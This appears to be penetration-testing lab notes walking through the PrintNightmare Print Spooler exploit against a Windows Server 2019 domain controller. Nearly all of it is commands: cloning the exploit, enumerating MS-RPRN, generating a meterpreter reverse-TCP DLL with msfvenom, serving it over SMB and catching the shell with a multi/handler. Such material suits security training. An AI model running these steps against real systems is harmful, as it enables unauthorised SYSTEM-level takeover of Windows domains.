# PrintNightmare
`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution.
Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.
Before conducting this attack, we must retrieve the exploit we will use. In this case, we will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit. We can use Git to clone it to our attack host:
## Cloning the Exploit
``` shell
git clone https://github.com/cube0x0/CVE-2021-1675.git
```
We may need to uninstall the version of Impacket on our attack host and install cube0x0's .
## Install cube0x0's Version of Impacket
```shell
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
## Enumerating for MS-RPRN to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.
``` shell
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
![image](https://github.com/user-attachments/assets/8665824e-4cd1-4d2c-9491-c08b70765227)

##crafting a DLL payload using `msfvenom`.
### Generating a DLL Payload
``` shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
host this payload in an SMB share we create on our attack host using `smbserver.py`.
```shell
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```
### Configuring & Starting MSF multi/handler
```shell
msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 172.16.5.225
LHOST => 172.16.5.225
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.5.225:8080
```
## Running the Exploit
``` shell
sudo python3 CVE-2021-1675.py Domain/User:Password@<DC-IP> '\\<Attacker-IP>\CompData\backupscript.dll'
```
Example
``` shell
sudo smbserver.py -smb2support CompData /home/Desktop/shared
```

